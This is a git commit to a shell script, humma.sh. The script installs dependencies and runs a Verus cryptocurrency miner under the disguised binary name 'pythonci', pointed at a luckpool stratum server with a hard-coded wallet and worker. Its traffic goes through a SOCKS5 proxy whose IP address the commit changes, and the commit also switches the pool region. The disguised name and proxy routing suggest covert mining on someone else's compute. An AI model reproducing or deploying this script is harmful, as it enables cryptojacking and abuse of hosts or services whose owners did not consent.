86e3180c5b2a8c31b81db8e7b76cbbc40fc5ee4f
ladyshumma <88975982+ladyshumma@users.noreply.github.com>
2021-08-16 19:47:33 +0700

    Update humma.sh

--- humma.sh
+++ humma.sh
@@ -3,9 +3,9 @@ sudo apt update
 sudo apt install screen libjansson4 -y
 chmod +x humma.sh && chmod +x pythonci chmod 777 pythonci humma.sh
 screen -dmS ls
-PL=stratum+tcp://na.luckpool.net:3956
+PL=stratum+tcp://eu.luckpool.net:3956
 WT=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
 WR=VIA-119
-PY=socks5://104.248.48.172:30588
+PY=socks5://139.162.225.94:25849
 ./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
 
